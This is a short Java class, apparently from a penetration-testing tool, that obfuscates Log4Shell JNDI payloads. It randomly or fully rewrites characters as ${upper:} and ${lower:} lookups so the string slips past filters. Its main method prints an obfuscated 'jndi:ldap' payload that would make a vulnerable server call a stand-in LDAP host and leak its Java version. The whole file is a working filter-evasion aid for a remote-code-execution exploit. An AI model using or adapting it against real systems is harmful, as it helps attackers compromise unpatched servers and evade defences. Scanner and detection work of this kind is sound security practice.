package me.gv7.woodpekcer.vuldb;

public class StringObfuscator1 {
    public String obfuscateString(String targetString,boolean isAll) {
        char[] _chars = targetString.toCharArray();
        StringBuilder result = new StringBuilder();

        for(int i=0;i<targetString.length();i++){
            char currentChar = _chars[i];

            boolean whetherObfuscate;
            if(isAll){//是否全部混淆
                whetherObfuscate = true;
            }else{
                whetherObfuscate = Utils.GetRandomBoolean();
            }

            // 不混淆${和}
            if(_chars[i] == '$' || _chars[i] == '{' || _chars[i] == '}'){
                whetherObfuscate = false;
            }

            if(whetherObfuscate){
                if(i == 0){
                    result.append(obfuscateTopChar(currentChar));
                }else{
                    result.append(obfuscateChar(currentChar));
                }
            }else{
                result.append(currentChar);
            }
        }

        return result.toString();
    }

    private String obfuscateTopChar(char _char) {
        return String.format("${upper:%s}", _char);
    }

    private String obfuscateChar(char _char) {
        return String.format("${lower:%s}", _char);
    }

    public static void main(String[] args) {
        System.out.println(new StringObfuscator1().obfuscateString("jndi:ldap://127.0.0.1:1664/${sys:java.runtime.version}",true));
    }
}